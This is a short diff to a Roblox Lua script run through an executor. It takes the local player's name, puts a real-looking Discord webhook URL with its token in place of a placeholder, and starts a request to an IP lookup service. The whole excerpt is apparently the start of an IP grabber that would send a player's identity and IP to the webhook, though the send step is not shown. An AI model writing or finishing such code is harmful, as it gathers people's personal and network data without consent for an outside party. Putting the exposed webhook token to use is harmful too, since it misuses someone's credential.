@@ -1,5 +1,5 @@
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "url"
+local webhook_url = "https://discord.com/api/webhooks/1200264189365731471/nTxlfXrorHVcetBu_7mCWhhvPRKMn58MhotH2dq0Fh7s2ftjbox4JSOkhsOkY8dCXf1j"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
